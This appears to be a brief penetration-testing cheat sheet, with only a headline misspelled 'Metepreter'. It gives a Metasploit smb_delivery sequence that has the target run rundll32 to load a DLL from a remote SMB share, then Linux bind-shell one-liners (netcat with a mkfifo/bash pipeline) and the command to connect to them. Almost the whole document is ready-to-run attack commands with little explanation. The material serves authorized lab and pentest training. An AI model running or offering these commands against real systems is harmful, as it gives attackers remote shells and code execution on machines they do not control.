
# Metepreter (Windows)

```powershell
# attack host
msfconsole -q
use exploit/windows/smb/smb_delivery
set target 0
set SRVHOST <kali-IP>
exploit

# window (copy cmd from msfconsole output)
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

# Bind Shells

## Linux

```bash
# target bind shells
nc -lvnp 1337

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

```bash
# connect from attack host to target
nc -nv 10.129.41.200 7777
```